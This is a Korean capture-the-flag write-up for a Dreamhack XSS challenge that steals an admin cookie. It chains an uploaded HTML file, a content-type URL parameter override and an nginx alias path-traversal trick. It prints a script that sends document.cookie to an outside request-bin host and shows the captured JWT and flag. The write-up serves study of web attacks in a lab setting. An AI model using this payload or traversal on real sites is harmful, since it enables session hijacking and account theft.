## 코드

## 풀이

게시판에 글을 올린 다음(파일 업로드) 관리자가 해당 글에 접속하게 만들어서 쿠키를 탈취하는 문제
우회해야 되는게 한두개가 아닌데, 솔직히 풀이 안봤으면 절대 못풀었다..

일단 기본적으로 xss 실행이 가능하게끔 만들기 위해 스크립트를 올려보았다.
근데 실행이 안되고 그냥 plain text로 된 파일만 보인다.
이를 우회하기 위해 서버 코드를 살펴보니 requests.args.get(content-type, text/plain)을 확인할 수 있었다.
이때 URL parameter에 content-type을 text/html로 설정하면 html 파일로 인식해서 코드를 실행시킬 수 있다.

```url
http://host1.dreamhack.games:18950/file/3ced0c04-8e57-4270-a209-ba5bee61163a/test.html?content-type=text/html
```

와 같은 방법으로 말이다.
(당연히 이 방법은 코드에서 args.get으로 파라미터를 가져오기 때문에 임의 설정이 가능한 것이다. 일반적인 우회는 안된다.)

그럼 어떤 스크립트를 올릴 것이냐가 문제인데, 역시 cookie를 가져와야 하므로 쿠키 값을 가지고 공격자 서버에 접속할 수 있도록 하는 스크립트를 올린다.
공격자 서버는 tools.dreamhack.io를 활용했다.

```js
<script>
location.href='http://cdyibyi.request.dreamhack.games/cookie?'.concat(document.cookie);
</script>
```

마지막으로 신경써야 되는 부분은, 우리가 접속하는 /file/{uuid}/test.html?content-type=text/html 주소는 쿠키를 사용하지 않는다.
서버 코드를 확인해보면 쿠키는 오직 @jwt_required()가 붙은 /user 경로에서만 사용되는 것을 볼 수 있다.
따라서 우리는 /user 주소를 활용해야 하며, 이 과정에서 nginx Path normalize 취약점을 활용할 수 있다. (이게 어려운 부분인듯)

```url
/user/..%2ffile/3ced0c04-8e57-4270-a209-ba5bee61163a/test.html?content-type=text/html
```

여기서 %2f는 / 이다.

nginx Path normalize 취약점은 nginx.conf에서 location을 지정할 때, 

```
location /i {
    alias /data/w3/images/;
}
```

와 같이 /i/가 아닌 /i와 같은 형태일때(/로 끝나지 않을 때) ../와 같은 문자열을 통해 경로 조작이 가능해지는 취약점이다.
이를 통해 /user/../file/... 와 같은 경로를 만들어낼 수 있고, Flask 입장에서는 /user 주소 이므로 쿠키를 넣어서 요청을 처리하게 된다.

이렇게 하면 다음과 같이 요청에 대한 결과가 서버로 오면서 문제 해결이 된다.

```dart

IP	139.99.121.66
Method	GET
Path	/cookie
QueryString	dream-token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJmcmVzaCI6ZmFsc2UsImlhdCI6MTY0ODQ2ODY4MCwianRpIjoiMjg3ODkxMDEtMWViMi00NTRkLTg0NjktMGE3NTNmNWY1MTc1IiwibmJmIjoxNjQ4NDY4NjgwLCJ0eXBlIjoiYWNjZXNzIiwic3ViIjoxLCJleHAiOjE2NDg0Njk1ODB9.IiKoJfOQuCg8de8MrVz9Ej8ZRplcOPFool5cKtxXzoA;%20FLAG=%22DH{37fd5ca4cbd7ddc3e13db1010e9bd5629a9f3c06}%22
```